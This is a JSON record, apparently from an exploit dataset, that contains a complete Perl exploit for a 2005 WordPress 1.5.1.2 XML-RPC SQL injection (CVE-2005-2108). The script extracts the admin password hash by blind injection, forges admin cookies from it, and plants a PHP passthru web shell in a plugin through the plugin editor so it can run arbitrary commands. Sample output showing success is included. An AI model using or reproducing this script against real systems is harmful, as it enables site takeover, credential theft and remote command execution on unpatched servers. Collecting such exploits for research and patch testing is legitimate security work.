{
  "id": "1077",
  "title": "WordPress Core 1.5.1.2 - &#039;xmlrpc&#039; Interface SQL Injection",
  "cve": "CVE-2005-2108",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n\r\n# sorry for the late posting, had to test it. /str0ke\r\n\r\n#################################################################\r\n# Wordpress 1.5.1.2 Strayhorn // XMLRPC Interface SQL Injection #\r\n#################################################################\r\n# By James Bercegay // http://www.gulftech.org/ // June 21 2005 #\r\n#################################################################\r\n# Quick and dirty proof of concept that uses the XML RPC server #\r\n# vulnerabilities I discovered to extract a password hash & use #\r\n# that hash to execute shell commands on the server as httpd :) #\r\n#################################################################\r\n# Technical details of WordPress XMLRPC Interface SQL Injection #\r\n#################################################################\r\n# The vulnerability exist because all XMLRPC data is taken from #\r\n# the HTTP_RAW_POST_DATA variable, and never sanatized properly #\r\n# thus leaving the doors open for attack. Also, most if not all #\r\n# the functions in xmlrpc.php are vulnerable to similar attacks #\r\n#################################################################\r\n#\r\n# C:\\Documents and Settings\\James\\Desktop>wp.pl http://pathto/wp admin 1 \"id;uname -a;pwd;uptime\"\r\n# [*] Trying Host http://pathto/wp ...\r\n# [+] The XMLRPC server seems to be working\r\n# [+] Char 1 is 2\r\n# [+] Char 2 is 1\r\n# [+] Char 3 is 2\r\n# [+] Char 4 is 3\r\n# [+] Char 5 is 2\r\n# [+] Char 6 is f\r\n# [+] Char 7 is 2\r\n# [+] Char 8 is 9\r\n# [+] Char 9 is 7\r\n# [+] Char 10 is a\r\n# [+] Char 11 is 5\r\n# [+] Char 12 is 7\r\n# [+] Char 13 is a\r\n# [+] Char 14 is 5\r\n# [+] Char 15 is a\r\n# [+] Char 16 is 7\r\n# [+] Char 17 is 4\r\n# [+] Char 18 is 3\r\n# [+] Char 19 is 8\r\n# [+] Char 20 is 9\r\n# [+] Char 21 is 4\r\n# [+] Char 22 is a\r\n# [+] Char 23 is 0\r\n# [+] Char 24 is e\r\n# [+] Char 25 is 4\r\n# [+] Char 26 is a\r\n# [+] Char 27 is 8\r\n# [+] Char 28 is 0\r\n# [+] Char 29 is 1\r\n# [+] Char 30 is f\r\n# [+] Char 31 is c\r\n# [+] Char 32 is 3\r\n# [+] Host : http://pathto/wp\r\n# [+] User : admin\r\n# [+] Hash : 21232f297a57a5a743894a0e4a801fc3\r\n# [*] Attempting to create shell ..\r\n# [+] Trying filename hello.php ...\r\n# [+] Trying to activate hello.php ...\r\n# [+] Trying to execute id;uname -a;pwd;uptime ...\r\n# [+] Successfully executed id;uname -a;pwd;uptime\r\n#\r\n# uid=1979(gulftech) gid=500(customer) groups=500(customer)\r\n# FreeBSD example.com 4.10-RELEASE FreeBSD 4.10-RELEASE #0: Tue Jan 1\r\n# 1 22:44:03 PST 2005     james@example.com:/usr/src/sys/compile/EXAMPLE  i386\r\n#\r\n# /www/htdocs/wp/wp-admin\r\n# 8:07AM  up 35 days, 20:01, 1 user, load averages: 7.98, 8.24, 8.14\r\n#\r\n#################################################################\r\n\r\nuse LWP::UserAgent;\r\nuse Digest::MD5 qw(md5_hex);\r\n\r\nmy $ua = new LWP::UserAgent;\r\n  $ua->agent(\"Wordpress Hash Grabber v1.0\" . $ua->agent);\r\n\r\nmy @char = (\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\",\"7\",\"8\",\"9\",\"a\",\"b\",\"c\",\"d\",\"e\",\"f\");\r\n\r\nmy $host = $ARGV[0]; # The path to xmlrpc.php\r\nmy $user = $ARGV[1]; # The target login, default wp user is admin\r\nmy $post = $ARGV[2]; # Must be a valid pingback or part\r\n                                    # of an entry title, very easy to\r\n                                        # obtain if you know how to read :)\r\nmy $exec = $ARGV[3]; # Command to execute\r\nmy $pref = 'wp_';    # database prefix!\r\nmy $hash = '';\r\n\r\nif ( !$ARGV[2] )\r\n{\r\n       die(\"Im Not Psychic ..\\n\");\r\n}\r\n\r\nprint \"[*] Trying Host $host ...\\n\";\r\n\r\nmy $res = $ua->get($host.'/xmlrpc.php');\r\n\r\nif ( $res->content =~ /XML-RPC server accepts POST requests only/is )\r\n{\r\n       print \"[+] The XMLRPC server seems to be working \\n\";\r\n}\r\nelse\r\n{\r\n       print \"[!] Something seems to be wrong with the XMLRPC server \\n \";\r\n       # Sloppy way of debugging, remove if you want\r\n       open(LOG, \">wp_out.html\"); print LOG $res->content;\r\n       exit;\r\n}\r\n\r\nfor( $i=1; $i < 33; $i++ )\r\n{\r\n       for( $j=0; $j < 16; $j++ )\r\n       {\r\n                               # oh my! :)\r\n                               my $sql = \"<?xml version=\\\"1.0\\\"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>foobar' UNION SELECT 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1 FROM \" . $pref . \"users WHERE (user_login='$user' AND MID(user_pass,$i,1)='$char[$j]')/*</string></value></param><param><value><string>$host/?p=$post#$post</string></value></param><param><value><string>admin</string></value></param></params></methodCall>\";\r\n\r\n                               # Remove the content type so $HTTP_RAW_POST_DATA is\r\n                               # populated. php.net guys, pleeeeaaase fix this! :)\r\n                               my $req = new HTTP::Request POST => $host . \"/xmlrpc.php\";\r\n                                  $req->content($sql);\r\n                                  $res = $ua->request($req);\r\n                              $out = $res->content;\r\n\r\n               if ( $out =~ /The pingback has already been registered/)\r\n               {\r\n                   $hash .= $char[$j];\r\n                   print \"[+] Char $i is $char[$j]\\n\";\r\n                   last;\r\n               }\r\n\r\n       }\r\n\r\n   if ( length($hash) < 1 )\r\n   {\r\n               # Sloppy way of debugging, remove if you want\r\n               open(LOG, \">wp_out.html\"); print LOG $out;\r\n\r\n               print \"[!] $host not vulnerable? Better verify manually!\\n\";\r\n               exit;\r\n       }\r\n                               if ( $out =~ /<value><int>0<\\/int><\\/value>/)\r\n                               {\r\n                                   print \"[!] Invalid post information specified! \\n\";\r\n                                       exit;\r\n                               }\r\n\r\n                               # Probably exploitable, but not by using default SQL query. The\r\n                               # [0]{5} regex may be a bad idea bit ive never seen a md5 thats\r\n                               # got 5 0's at the very beginning of it.\r\n                               if ( $out =~ /different number of columns/is || $hash =~ /([0]{5})/ )\r\n                               {\r\n                                       # Sloppy way of debugging, remove if you want\r\n                                       open(LOG, \">wp_out.html\"); print LOG $out;\r\n\r\n                                       print \"[!] The database structured has been altered, check manually \\n\";\r\n                                       exit;\r\n                               }\r\n\r\n}\r\n\r\n# Verbose\r\nprint \"[+] Host : $host\\n\";\r\nprint \"[+] User : $user\\n\";\r\nprint \"[+] Hash : $hash\\n\";\r\n\r\n# We got the hash, so we are guaranteed admin\r\n# even if we can not successfully execute! :)\r\nprint \"[*] Attempting to create shell .. \\n\";\r\n\r\n# Here we md5 the passhash, as well as the host\r\n# in order to get the cookie hash, and the pass\r\n# hash values respectively.\r\nmy $ckey = md5_hex($host);\r\n  $hash = md5_hex($hash);\r\n\r\n# Create the cookie used to make all admin requests\r\nmy @cookie = ('Referer' => $host.'/wp-admin/plugins.php;','Cookie' => 'wordpressuser_'.$ckey.'='.$user.'; wordpresspass_'.$ckey.'='. $hash);\r\n  $res = $ua->get($host.'/wp-admin/plugin-editor.php', @cookie);\r\n\r\n# Let's get the filename from the plugin editor\r\nif ( $res->content =~ /<strong>(.*)\\.php<\\/strong>/i )\r\n{\r\n       # Seems our request went okay, and we have the filename!\r\n       my @list = ($1.'.php', 'hello.php', 'markdown.php', 'textile1.php');\r\n       my $file;\r\n\r\n       # Make it work one way or another :)\r\n       foreach $file (@list)\r\n       {\r\n\r\n               print \"[+] Trying filename $file ...\\n\";\r\n               $res = $ua->get($host.'/wp-admin/plugin-editor.php?file='.$file, @cookie);\r\n\r\n               if ( $res->content =~ /<textarea[^>]*>(.*)<\\/textarea>/is )\r\n               {\r\n                       # This is the file contents\r\n                       my $data = $1;\r\n\r\n                          # Quick and dirty way to fix the data recieved\r\n                          # so that it executes and does not cause error\r\n                          $data =~ s/>/>/ig;\r\n                          $data =~ s/</</ig;\r\n                          $data =~ s/\"/\"/ig;\r\n                          $data =~ s/&/&/ig;\r\n\r\n\r\n\r\n                       # We use the <cmdout> tag to make it easy to grab out command output\r\n                       my $add = ( $data =~ /<cmdout>(.*)<\\/cmdout>/is ) ? '': '<cmdout><?php if ( !empty($_REQUEST[\"cmd\"]) ) passthru($_REQUEST[\"cmd\"]); ?></cmdout>';\r\n\r\n                          # Adding our php code to the selected plugin\r\n                          $res = $ua->post($host . \"/wp-admin/plugin-editor.php\", ['newcontent' => $add.$data, 'action' => 'update', 'file' => $file, 'submit' => 'foobar'], @cookie);\r\n\r\n                          # Trying to activate the plugin. If the requests doesn't succeed\r\n                          # then the command execution will fail unless the plugin has had\r\n                          print \"[+] Trying to activate $file ... \\n\";\r\n                          $res = $ua->get($host.'/wp-admin/plugins.php?action=activate&plugin='.$file , @cookie);\r\n\r\n                          # Depending on the plugin this should execute\r\n                          # our command, else we try the file directly!\r\n                          # this works everytime on the default install\r\n                          print \"[+] Trying to execute $exec ... \\n\";\r\n                      $res = $ua->get($host.'/wp-admin/plugins.php?cmd='.$exec, @cookie);\r\n\r\n                          # It seems we have executed our command successfully\r\n                          if ( $res->content =~ /<cmdout>(.*)<\\/cmdout>/is )\r\n                          {\r\n                                  # Send results to STDOUT\r\n                              print \"[+] Successfully executed $exec\\n\\n\\n\";\r\n                                  print $1;\r\n                                  exit;\r\n                          }\r\n                          else\r\n                          {\r\n                                  # No luck with that particular method, so\r\n                                  # we will try to access the modified file\r\n                                  print \"[!] Couldnt execute command $exec\\n\";\r\n                                  open(LOG, \">wp_out.html\"); print LOG $res->content;\r\n\r\n                                  # Trying to access the file directly and execute\r\n                                  print \"[!] Trying to access $file directly!\\n\";\r\n                                  $res = $ua->get($host.'/wp-content/plugins/'.$file.'?cmd='.$exec, @cookie);\r\n\r\n                                   # It seems we have executed our command successfully\r\n                                  if ( $res->content =~ /<cmdout>(.*)<\\/cmdout>/is )\r\n                                  {\r\n                                          # Send results to STDOUT\r\n                                  print \"[+] Successfully executed $exec\\n\\n\\n\";\r\n                                      print $1;\r\n                                          exit;\r\n                                  }\r\n                                  else\r\n                                  {\r\n                                          # No luck, better take a look at things manually\r\n                                      print \"[!] Couldnt execute command $exec\\n\";\r\n                                          print \"[*] Try $host/wp-content/plugins/$file manually\\n\";\r\n                                  }\r\n                          }\r\n               }\r\n               else\r\n               {\r\n                       # Unable to get the file contents\r\n                       print \"[!] Could not read file $file \\n\";\r\n                       open(LOG, \">wp_out.html\"); print LOG $res->content . $file;\r\n               }\r\n\r\n       }\r\n\r\n}\r\nelse\r\n{\r\n       # Unable to get the plugin information\r\n       print \"[!] Could Not Get Plugin Information\\n\";\r\n       open(LOG, \">wp_out.html\"); print LOG $res->content;\r\n}\r\n\r\n# fin\r\nexit;\r\n\r\n# milw0rm.com [2005-06-30]",
  "url": "https://www.exploit-db.com/exploits/1077"
}